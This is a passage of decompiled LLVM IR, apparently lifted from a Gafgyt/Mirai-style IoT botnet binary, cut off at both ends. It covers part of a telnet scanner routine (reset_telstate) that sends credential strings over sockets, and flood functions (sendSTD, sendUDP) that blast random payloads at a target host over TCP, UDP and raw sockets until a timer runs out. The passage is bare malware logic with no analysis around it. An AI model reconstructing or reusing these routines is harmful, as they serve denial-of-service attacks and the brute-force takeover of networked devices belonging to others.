  br label %dec_label_pc_df5c

dec_label_pc_dd3c:                                ; preds = %dec_label_pc_dbe4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v3_dd58 = call i32 @reset_telstate(i32 %v2_cdf0, i32 %v3_cc88, i32 %v3_cde4)
  br label %dec_label_pc_df5c

dec_label_pc_dd8c:                                ; preds = %dec_label_pc_dae8
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  %v2_dda8 = add i32 %v2_cdec, %v2_d560
  store i32 %v2_dda8, i32* %r3.global-to-local, align 4
  %v1_ddac = inttoptr i32 %v2_dda8 to i32*
  %v2_ddac = load i32, i32* %v1_ddac, align 4
  store i32 %v2_ddac, i32* %r3.global-to-local, align 4
  %v1_ddb0 = add i32 %v2_ddac, 7
  store i32 %v1_ddb0, i32* @r4, align 4
  %v2_ddb8 = call i32 @__GI_time(i32* null)
  store i32 %v2_ddb8, i32* %r3.global-to-local, align 4
  %v0_ddc0 = load i32, i32* @r4, align 4
  %v3_ddc0 = icmp ult i32 %v0_ddc0, %v2_ddb8
  br i1 %v3_ddc0, label %dec_label_pc_ddc8, label %dec_label_pc_df5c

dec_label_pc_ddc8:                                ; preds = %dec_label_pc_dd8c
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v3_dde4 = call i32 @reset_telstate(i32 %v2_cdf0, i32 %v3_cc88, i32 %v3_cde4)
  br label %dec_label_pc_df5c

dec_label_pc_ddec:                                ; preds = %dec_label_pc_ce3c
  store i32 %storemerge553, i32* @r4, align 4
  %v2_ddf4 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_de08 = load i32, i32* @r4, align 4
  %v2_de14 = mul i32 %v0_de08, 28
  %v2_de1c = add i32 %v2_d560, %v2_de14
  %v2_de20 = inttoptr i32 %v2_de1c to i32*
  store i32 %v2_ddf4, i32* %v2_de20, align 4
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v1_de3c = inttoptr i32 %v2_cdf0 to i32*
  %v2_de3c = load i32, i32* %v1_de3c, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_de50 = call i32 @__libc_send(i32 %v2_de3c, i32* bitcast ([5 x i8]* @global_var_1ba08.350 to i32*), i32 4, i32 16384)
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v2_de6c = load i32, i32* %v1_de3c, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_de80 = call i32 @__libc_send(i32 %v2_de6c, i32* bitcast ([8 x i8]* @global_var_1ba10.352 to i32*), i32 7, i32 16384)
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v2_de9c = load i32, i32* %v1_de3c, align 4
  store i32 %v2_de9c, i32* @r4, align 4
  %v2_dea4 = load i32, i32* bitcast ([504 x i8]** @global_var_2d184.355 to i32*), align 4
  store i32 %v2_dea4, i32* @r5, align 4
  store i32 %v2_dea4, i32* %r3.global-to-local, align 4
  %v1_deb0 = inttoptr i32 %v2_dea4 to i8*
  %v3_deb4 = call i32 @strlen(i8* %v1_deb0)
  %v0_debc = load i32, i32* @r4, align 4
  %v0_dec0 = load i32, i32* @r5, align 4
  store i32 %v3_deb4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %tmp44 = inttoptr i32 %v0_dec0 to i32*
  %v6_decc = call i32 @__libc_send(i32 %v0_debc, i32* %tmp44, i32 %v3_deb4, i32 16384)
  store i32 %v6_decc, i32* %r3.global-to-local, align 4
  %v1_ded4 = icmp slt i32 %v6_decc, 0
  br i1 %v1_ded4, label %dec_label_pc_dedc, label %dec_label_pc_df00

dec_label_pc_dedc:                                ; preds = %dec_label_pc_ddec
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v3_def8 = call i32 @reset_telstate(i32 %v2_cdf0, i32 %v3_cc88, i32 %v3_cde4)
  br label %dec_label_pc_df5c

dec_label_pc_df00:                                ; preds = %dec_label_pc_ddec
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  %v2_df1c = add i32 %v2_cdec, %v2_d560
  store i32 %v2_df1c, i32* %r3.global-to-local, align 4
  %v1_df20 = inttoptr i32 %v2_df1c to i32*
  %v2_df20 = load i32, i32* %v1_df20, align 4
  store i32 %v2_df20, i32* %r3.global-to-local, align 4
  %v1_df24 = add i32 %v2_df20, 25
  store i32 %v1_df24, i32* @r4, align 4
  %v2_df2c = call i32 @__GI_time(i32* null)
  store i32 %v2_df2c, i32* %r3.global-to-local, align 4
  %v0_df34 = load i32, i32* @r4, align 4
  %v3_df34 = icmp ult i32 %v0_df34, %v2_df2c
  br i1 %v3_df34, label %dec_label_pc_df3c, label %dec_label_pc_df5c

dec_label_pc_df3c:                                ; preds = %dec_label_pc_df00
  store i32 %v3_cde4, i32* %r2.global-to-local, align 4
  store i32 %v2_cdf0, i32* %r3.global-to-local, align 4
  %v3_df58 = call i32 @reset_telstate(i32 %v2_cdf0, i32 %v3_cc88, i32 %v3_cde4)
  br label %dec_label_pc_df5c

dec_label_pc_df5c:                                ; preds = %dec_label_pc_d548, %dec_label_pc_d694, %dec_label_pc_d934, %dec_label_pc_dd8c, %dec_label_pc_df00, %dec_label_pc_ce3c, %dec_label_pc_d130, %dec_label_pc_dedc, %dec_label_pc_ddc8, %dec_label_pc_dd3c, %dec_label_pc_dc70, %dec_label_pc_dc48, %dec_label_pc_dbbc, %dec_label_pc_dac0, %dec_label_pc_da9c, %dec_label_pc_da3c, %dec_label_pc_d970, %dec_label_pc_d90c, %dec_label_pc_d8e4, %dec_label_pc_d820, %dec_label_pc_d7fc, %dec_label_pc_d79c, %dec_label_pc_d6d0, %dec_label_pc_d66c, %dec_label_pc_d644, %dec_label_pc_d584, %dec_label_pc_d524, %dec_label_pc_d490, %dec_label_pc_d46c, %dec_label_pc_d2c0, %dec_label_pc_d29c, %dec_label_pc_d104, %dec_label_pc_d0ac, %dec_label_pc_df3c
  %v1_df60 = add nuw nsw i32 %storemerge553, 1
  store i32 %v1_df60, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v5_df74 = icmp slt i32 %v1_df60, %arg2
  br i1 %v5_df74, label %dec_label_pc_cdd8, label %dec_label_pc_cdcc

; uselistorder directives
  uselistorder i32 %v1_df60, { 2, 1, 0 }
  uselistorder i32 %v3_deb4, { 1, 0 }
  uselistorder i32* %v1_db00, { 1, 0, 2, 3 }
  uselistorder i32 %v3_da14, { 1, 0 }
  uselistorder i32 %v3_d774, { 1, 0 }
  uselistorder i32 %v5_d3fc, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge610, { 1, 0 }
  uselistorder i32 %v0_cf84, { 1, 0 }
  uselistorder i32 %v2_ced8, { 0, 3, 2, 1 }
  uselistorder i32 %v2_ced4, { 1, 0, 2, 3 }
  uselistorder i8* %v2_ceac, { 2, 1, 0, 3 }
  uselistorder i32 %v2_cea8, { 0, 2, 1, 3, 4, 5, 6, 7 }
  uselistorder i8 %v2_ce5c, { 1, 0 }
  uselistorder i32 %v0_ce20, { 1, 0 }
  uselistorder i32* %v1_cdf8, { 1, 0, 2 }
  uselistorder i32 %v2_cdf4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_cdf0, { 77, 76, 75, 74, 78, 79, 81, 80, 60, 59, 62, 61, 64, 65, 66, 68, 67, 63, 70, 69, 71, 73, 72, 54, 53, 52, 51, 56, 55, 58, 57, 47, 46, 48, 4, 50, 49, 41, 40, 39, 38, 43, 42, 45, 44, 34, 33, 35, 3, 37, 36, 28, 27, 26, 25, 19, 20, 21, 23, 22, 24, 29, 30, 32, 31, 6, 8, 7, 9, 10, 11, 13, 12, 16, 1, 2, 15, 14, 0, 18, 17, 5 }
  uselistorder i32 %v2_cdec, { 0, 1, 2, 3, 4, 5, 7, 8, 6 }
  uselistorder i32 %v3_cde4, { 81, 82, 80, 78, 79, 77, 76, 75, 61, 62, 60, 65, 66, 73, 72, 71, 69, 70, 68, 67, 64, 74, 63, 59, 58, 56, 57, 54, 55, 53, 52, 51, 47, 48, 46, 50, 49, 45, 44, 42, 43, 40, 41, 39, 38, 37, 33, 34, 32, 36, 35, 31, 30, 28, 29, 27, 25, 26, 23, 22, 24, 21, 20, 19, 18, 17, 11, 9, 10, 8, 7, 6, 5, 4, 16, 15, 14, 13, 12, 3, 2, 1, 0 }
  uselistorder i32 %storemerge553, { 1, 4, 5, 6, 7, 10, 9, 8, 3, 2, 0 }
  uselistorder i32 %v2_d560, { 3, 0, 4, 1, 5, 2 }
  uselistorder i32 %v2_d2e8, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v2_d188, { 1, 0 }
  uselistorder i32 %v1_cdb0, { 1, 2, 0 }
  uselistorder i32 %v1_cd8c, { 2, 1, 0 }
  uselistorder i32 %storemerge462, { 1, 0 }
  uselistorder i32 %v2_ccac, { 1, 0 }
  uselistorder i32 %v3_cc88, { 4, 3, 5, 6, 7, 9, 8, 10, 12, 11, 13, 16, 15, 14, 18, 0, 19, 17, 1, 22, 23, 24, 21, 2, 20 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-612, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 152, 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 16, 14, 15, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 30, 28, 29, 31, 32, 33, 34, 35, 38, 36, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 53, 50, 51, 54, 55, 56, 52, 59, 57, 58, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 74, 71, 72, 75, 76, 77, 73, 80, 78, 79, 81, 84, 82, 83, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 146, 103, 104, 105, 106, 109, 107, 108, 110, 111, 112, 113, 114, 115, 116, 117, 119, 118, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 147, 148, 149, 150, 151, 176, 153, 154, 155, 168, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 177, 169, 170, 171, 173, 172, 175, 174 }
  uselistorder i32* %r2.global-to-local, { 99, 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 104, 100, 101, 105, 102, 103 }
  uselistorder i32 (i32)* @contains_success, { 1, 0 }
  uselistorder i32 ptrtoint ([3 x i8*]* @global_var_2d194.343 to i32), { 2, 3, 0, 4, 1, 5 }
  uselistorder i32* bitcast ([3 x i8]* @global_var_1b9ec.341 to i32*), { 1, 0 }
  uselistorder i32 ptrtoint ([6 x i8*]* @global_var_2d188.339 to i32), { 2, 3, 0, 4, 1, 5 }
  uselistorder i32 (i32)* @contains_fail, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @reset_telstate, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 115, { 1, 0, 2 }
  uselistorder i32 %arg2, { 5, 4, 2, 7, 6, 0, 1, 3, 8, 9 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_df5c, { 33, 4, 7, 8, 3, 9, 10, 11, 12, 13, 14, 15, 16, 2, 17, 18, 19, 20, 21, 22, 1, 23, 24, 25, 0, 26, 27, 28, 29, 30, 6, 31, 32, 5 }
  uselistorder label %dec_label_pc_d2fc, { 1, 0 }
  uselistorder label %dec_label_pc_d2c0, { 1, 0 }
  uselistorder label %dec_label_pc_ce3c, { 1, 0 }
  uselistorder label %dec_label_pc_cdd8, { 1, 0 }
  uselistorder label %dec_label_pc_cdcc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ccd0, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_df80 = load i32, i32* @fp, align 4
  store i32 %v3_df80, i32* %stack_var_-16, align 4
  store i32 57224, i32* %stack_var_-4, align 4
  %v13_df80 = ptrtoint i32* %stack_var_-16 to i32
  %v2_df84 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_df84, i32* @fp, align 4
  store i32 %arg3, i32* %stack_var_-208, align 4
  %v0_dfa4 = call i32 @socket()
  %v2_dfb4 = call i32 @__GI_time(i32* null)
  %v1_dfc8 = call i32 @__GI_gethostbyname(i32 %arg1)
  store i32 16, i32* @r2, align 4
  %v2_dfe4 = bitcast i32* %stack_var_-52 to i8*
  %v3_dfe4 = call i32 @__GI_memset(i8* %v2_dfe4, i32 0)
  %v1_dfec = add i32 %v1_dfc8, 16
  %v2_dfec = inttoptr i32 %v1_dfec to i32*
  %v3_dfec = load i32, i32* %v2_dfec, align 4
  %v1_dff0 = inttoptr i32 %v3_dfec to i32*
  %v2_dff0 = load i32, i32* %v1_dff0, align 4
  %v2_dff8 = ptrtoint i32* %stack_var_-48 to i32
  %v1_e000 = add i32 %v1_dfc8, 12
  %v2_e000 = inttoptr i32 %v1_e000 to i32*
  %v3_e000 = load i32, i32* %v2_e000, align 4
  store i32 %v3_e000, i32* @r2, align 4
  %v3_e010 = call i32 @bcopy(i32 %v2_dff0, i32 %v2_dff8, i32 %v3_e000)
  %v1_e018 = add i32 %v1_dfc8, 8
  %v2_e018 = inttoptr i32 %v1_e018 to i32*
  %v3_e018 = load i32, i32* %v2_e018, align 4
  %v3_e020 = urem i32 %v3_e018, 65536
  store i32 %v3_e020, i32* %stack_var_-52, align 4
  %v2_e054 = ptrtoint i32* %stack_var_-196 to i32
  %v3_e0d0 = bitcast i32* %stack_var_-52 to %sockaddr*
  %v2_e090 = add i32 %v13_df80, -180
  br label %dec_label_pc_e050

dec_label_pc_e050:                                ; preds = %dec_label_pc_e10c, %entry
  %storemerge3 = phi i32 [ 0, %entry ], [ %v1_e110, %dec_label_pc_e10c ]
  store i32 %v2_e054, i32* @r0, align 4
  store i32 ptrtoint ([36 x i8*]* @global_var_1bbbc.393 to i32), i32* @r1, align 4
  store i32 144, i32* @r2, align 4
  %v0_e068 = call i32 @memcpy()
  %v0_e06c = call i32 @random()
  %tmp = icmp ult i32 %storemerge3, 50
  br i1 %tmp, label %dec_label_pc_e10c, label %dec_label_pc_e0ac

dec_label_pc_e0ac:                                ; preds = %dec_label_pc_e050
  %v2_e07c = urem i32 %v0_e06c, 36
  %v3_e088 = mul nuw nsw i32 %v2_e07c, 4
  %v2_e094 = add i32 %v2_e090, %v3_e088
  %v1_e098 = inttoptr i32 %v2_e094 to i32*
  %v2_e098 = load i32, i32* %v1_e098, align 4
  %v5_e0bc = inttoptr i32 %v2_e098 to i32*
  %v6_e0bc = call i32 @__libc_send(i32 %v0_dfa4, i32* %v5_e0bc, i32 65, i32 0)
  %v4_e0d0 = call i32 @__libc_connect(i32 %v0_dfa4, %sockaddr* %v3_e0d0, i32 16)
  %v2_e0d8 = call i32 @__GI_time(i32* null)
  %v3_e0e4 = load i32, i32* %stack_var_-208, align 4
  %v2_e0e8 = add i32 %v3_e0e4, %v2_dfb4
  %v5_e0f0 = icmp slt i32 %v2_e0d8, %v2_e0e8
  br i1 %v5_e0f0, label %dec_label_pc_e104, label %dec_label_pc_e0f4

dec_label_pc_e0f4:                                ; preds = %dec_label_pc_e0ac
  %v1_e0f8 = call i32 @__libc_close(i32 %v0_dfa4)
  %v1_e100 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_e104:                                ; preds = %dec_label_pc_e0ac
  br label %dec_label_pc_e10c

dec_label_pc_e10c:                                ; preds = %dec_label_pc_e050, %dec_label_pc_e104
  %stack_var_-24.0 = phi i32 [ %storemerge3, %dec_label_pc_e050 ], [ 0, %dec_label_pc_e104 ]
  %v1_e110 = add i32 %stack_var_-24.0, 1
  br label %dec_label_pc_e050

; uselistorder directives
  uselistorder i32 %storemerge3, { 1, 0 }
  uselistorder i32 %v3_e000, { 1, 0 }
  uselistorder i32 %v1_dfc8, { 2, 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 0, 2, 1 }
  uselistorder i32 65, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 1, 0 }
  uselistorder label %dec_label_pc_e10c, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v3_e124 = load i32, i32* @r4, align 4
  %v6_e124 = load i32, i32* @fp, align 4
  store i32 57644, i32* %stack_var_-4, align 4
  %v2_e128 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_e128, i32* @fp, align 4
  %v2_e12c = ptrtoint i32* %stack_var_-144 to i32
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-76, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v2_e154 = icmp eq i32 %arg2, 0
  br i1 %v2_e154, label %dec_label_pc_e15c, label %dec_label_pc_e17c

dec_label_pc_e15c:                                ; preds = %entry
  %v0_e15c = call i32 @rand_cmwc()
  %v3_e164 = mul i32 %v0_e15c, 65536
  store i32 %v3_e164, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e1a0

dec_label_pc_e17c:                                ; preds = %entry
  %v3_e184 = urem i32 %arg2, 65536
  store i32 %v3_e184, i32* %r3.global-to-local, align 4
  %v1_e18c = call i32 @htons(i32 %v3_e184)
  br label %dec_label_pc_e1a0

dec_label_pc_e1a0:                                ; preds = %dec_label_pc_e15c, %dec_label_pc_e17c
  %v2_e1a4 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_e1a4, i32* %r3.global-to-local, align 4
  %v3_e1b0 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-72)
  store i32 %v3_e1b0, i32* %r3.global-to-local, align 4
  %v2_e1b8 = icmp eq i32 %v3_e1b0, 0
  br i1 %v2_e1b8, label %dec_label_pc_e1c0, label %dec_label_pc_e814

dec_label_pc_e1c0:                                ; preds = %dec_label_pc_e1a0
  %v2_e1c0 = ptrtoint i32* %stack_var_-76 to i32
  %v2_e1c4 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_e1c4, i32* %r2.global-to-local, align 4
  store i32 0, i32* %stack_var_-68, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v7_e1e4 = icmp eq i32 %arg4, 32
  br i1 %v7_e1e4, label %dec_label_pc_e1ec, label %dec_label_pc_e380

dec_label_pc_e1ec:                                ; preds = %dec_label_pc_e1c0
  store i32 17, i32* @r2, align 4
  %v0_e1f8 = call i32 @socket()
  store i32 %v0_e1f8, i32* %r3.global-to-local, align 4
  %v2_e208 = icmp eq i32 %v0_e1f8, 0
  br i1 %v2_e208, label %dec_label_pc_e210, label %dec_label_pc_e228

dec_label_pc_e210:                                ; preds = %dec_label_pc_e1ec
  %v2_e214 = load i32, i32* @global_var_2d604.55, align 4
  store i32 %v2_e214, i32* %r3.global-to-local, align 4
  %v3_e220 = call i32 @sockprintf(i32 %v2_e214, i32 ptrtoint ([27 x i8]* @global_var_1bc4c.396 to i32))
  br label %dec_label_pc_e814

dec_label_pc_e228:                                ; preds = %dec_label_pc_e1ec
  %v3_e228 = load i32, i32* %stack_var_0, align 4
  %v1_e22c = add i32 %v3_e228, 1
  store i32 %v1_e22c, i32* %r3.global-to-local, align 4
  %v1_e234 = call i32 @malloc(i32 %v1_e22c)
  store i32 %v1_e234, i32* %r3.global-to-local, align 4
  %v2_e244 = icmp eq i32 %v1_e234, 0
  br i1 %v2_e244, label %dec_label_pc_e814, label %dec_label_pc_e24c

dec_label_pc_e24c:                                ; preds = %dec_label_pc_e228
  %v3_e24c = load i32, i32* %stack_var_0, align 4
  %v1_e250 = add i32 %v3_e24c, 1
  store i32 %v1_e250, i32* @r2, align 4
  store i32 %v1_e234, i32* %r3.global-to-local, align 4
  %v2_e264 = inttoptr i32 %v1_e234 to i8*
  %v3_e264 = call i32 @__GI_memset(i8* %v2_e264, i32 0)
  %v2_e270 = call i32 @makeRandomStr(i32 %v1_e234, i32 %v3_e24c)
  %v2_e278 = call i32 @__GI_time(i32* null)
  %v2_e284 = add i32 %v2_e278, %arg3
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_e2c4 = inttoptr i32 %v1_e234 to i32*
  %v3_e348 = mul i32 %arg8, 4
  %v3_e358 = mul i32 %arg8, 1000
  br label %dec_label_pc_e2a0.outer

dec_label_pc_e2a0.outer:                          ; preds = %dec_label_pc_e370, %dec_label_pc_e340, %dec_label_pc_e24c
  %stack_var_-108.0.ph = phi i32 [ 0, %dec_label_pc_e24c ], [ %v1_e374, %dec_label_pc_e370 ], [ 0, %dec_label_pc_e340 ]
  %stack_var_-112.0.ph = phi i32 [ 0, %dec_label_pc_e24c ], [ %v1_e328, %dec_label_pc_e370 ], [ %v1_e328, %dec_label_pc_e340 ]
  br label %dec_label_pc_e2a0

dec_label_pc_e2a0:                                ; preds = %dec_label_pc_e2a0.outer, %dec_label_pc_e318
  %stack_var_-112.0 = phi i32 [ 0, %dec_label_pc_e318 ], [ %stack_var_-112.0.ph, %dec_label_pc_e2a0.outer ]
  %v3_e2a0 = load i32, i32* %stack_var_0, align 4
  store i32 %v2_e1c0, i32* %stack_var_-144, align 4
  store i32 %v3_e2a0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_e2c4 = call i32 @__libc_sendto(i32 %v0_e1f8, i32* %v6_e2c4, i32 %v3_e2a0, i32 0, i32 %v2_e1c0, i32 16)
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v9_e2d0 = icmp eq i32 %stack_var_-112.0, %arg6
  br i1 %v9_e2d0, label %dec_label_pc_e2d8, label %dec_label_pc_e324

dec_label_pc_e2d8:                                ; preds = %dec_label_pc_e2a0
  store i32 %arg2, i32* %r3.global-to-local, align 4
  br i1 %v2_e154, label %dec_label_pc_e2e4, label %dec_label_pc_e300

dec_label_pc_e2e4:                                ; preds = %dec_label_pc_e2d8
  %v0_e2e4 = call i32 @rand_cmwc()
  %v3_e2f0 = udiv i32 %v0_e2e4, 256
  %v3_e2f85 = urem i32 %v3_e2f0, 256
  store i32 %v3_e2f85, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e300

dec_label_pc_e300:                                ; preds = %dec_label_pc_e2d8, %dec_label_pc_e2e4
  %v2_e304 = call i32 @__GI_time(i32* null)
  store i32 %v2_e304, i32* %r2.global-to-local, align 4
  store i32 %v2_e284, i32* %r3.global-to-local, align 4
  %v8_e314 = icmp sgt i32 %v2_e304, %v2_e284
  br i1 %v8_e314, label %dec_label_pc_e814, label %dec_label_pc_e318

dec_label_pc_e318:                                ; preds = %dec_label_pc_e300
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e2a0

dec_label_pc_e324:                                ; preds = %dec_label_pc_e2a0
  %v1_e328 = add i32 %stack_var_-112.0, 1
  store i32 %arg7, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-108.0.ph, i32* %r2.global-to-local, align 4
  %v9_e338 = icmp eq i32 %stack_var_-108.0.ph, %arg7
  br i1 %v9_e338, label %dec_label_pc_e340, label %dec_label_pc_e370

dec_label_pc_e340:                                ; preds = %dec_label_pc_e324
  store i32 %v3_e348, i32* %r2.global-to-local, align 4
  store i32 %v3_e358, i32* %r3.global-to-local, align 4
  %v1_e360 = call i32 @usleep(i32 %v3_e358)
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e2a0.outer

dec_label_pc_e370:                                ; preds = %dec_label_pc_e324
  %v1_e374 = add i32 %stack_var_-108.0.ph, 1
  br label %dec_label_pc_e2a0.outer

dec_label_pc_e380:                                ; preds = %dec_label_pc_e1c0
  store i32 %v2_e12c, i32* %r3.global-to-local, align 4
  store i32 17, i32* @r2, align 4
  %v0_e394 = call i32 @socket()
  store i32 %v0_e394, i32* %r3.global-to-local, align 4
  %v2_e3a4 = icmp eq i32 %v0_e394, 0
  br i1 %v2_e3a4, label %dec_label_pc_e3ac, label %dec_label_pc_e3c4

dec_label_pc_e3ac:                                ; preds = %dec_label_pc_e380
  %v2_e3b0 = load i32, i32* @global_var_2d604.55, align 4
  store i32 %v2_e3b0, i32* %r3.global-to-local, align 4
  %v3_e3bc = call i32 @sockprintf(i32 %v2_e3b0, i32 ptrtoint ([27 x i8]* @global_var_1bc4c.396 to i32))
  br label %dec_label_pc_e810

dec_label_pc_e3c4:                                ; preds = %dec_label_pc_e380
  store i32 1, i32* %stack_var_-80, align 4
  %v2_e3cc = ptrtoint i32* %stack_var_-80 to i32
  store i32 4, i32* %stack_var_-144, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 %v2_e3cc, i32* %r3.global-to-local, align 4
  %v6_e3e8 = call i32 @__GI_setsockopt(i32 %v0_e394, i32 0, i32 3, i32* nonnull %stack_var_-80, i32 4)
  store i32 %v6_e3e8, i32* %r3.global-to-local, align 4
  %v1_e3f0 = icmp slt i32 %v6_e3e8, 0
  br i1 %v1_e3f0, label %dec_label_pc_e3f8, label %dec_label_pc_e410

dec_label_pc_e3f8:                                ; preds = %dec_label_pc_e3c4
  %v2_e3fc = load i32, i32* @global_var_2d604.55, align 4
  store i32 %v2_e3fc, i32* %r3.global-to-local, align 4
  %v3_e408 = call i32 @sockprintf(i32 %v2_e3fc, i32 ptrtoint ([33 x i8]* @global_var_1bc68.398 to i32))
  br label %dec_label_pc_e810

dec_label_pc_e410:                                ; preds = %dec_label_pc_e3c4
  store i32 49, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e41c

dec_label_pc_e41c:                                ; preds = %dec_label_pc_e410, %dec_label_pc_e41c
  %v1_e45426 = phi i32 [ 49, %dec_label_pc_e410 ], [ %v1_e454, %dec_label_pc_e41c ]
  %v2_e420 = call i32 @__GI_time(i32* null)
  store i32 %v2_e420, i32* %r3.global-to-local, align 4
  store i32 %v2_e420, i32* @r4, align 4
  %v0_e42c = call i32 @rand_cmwc()
  %v0_e434 = load i32, i32* @r4, align 4
  %v2_e434 = xor i32 %v0_e434, %v0_e42c
  store i32 %v2_e434, i32* %r3.global-to-local, align 4
  %v1_e43c = call i32 @srand(i32 %v2_e434)
  %v0_e440 = call i32 @random()
  store i32 %v0_e440, i32* %r3.global-to-local, align 4
  %v1_e44c = call i32 @init_rand(i32 %v0_e440)
  %v1_e454 = add nsw i32 %v1_e45426, -1
  store i32 %v1_e454, i32* %r3.global-to-local, align 4
  %v3_e460 = icmp eq i32 %v1_e45426, 0
  br i1 %v3_e460, label %dec_label_pc_e468, label %dec_label_pc_e41c

dec_label_pc_e468:                                ; preds = %dec_label_pc_e41c
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %v2_e46c = icmp eq i32 %arg4, 0
  br i1 %v2_e46c, label %dec_label_pc_e498, label %dec_label_pc_e480

dec_label_pc_e480:                                ; preds = %dec_label_pc_e468
  %v1_e484 = sub i32 32, %arg4
  store i32 %v1_e484, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v1_e490 = shl i32 -1, %v1_e484
  br label %dec_label_pc_e498

dec_label_pc_e498:                                ; preds = %dec_label_pc_e468, %dec_label_pc_e480
  %storemerge12 = phi i32 [ %v1_e490, %dec_label_pc_e480 ], [ 0, %dec_label_pc_e468 ]
  %v3_e498 = load i32, i32* %stack_var_0, align 4
  %v1_e49c = add i32 %v3_e498, 28
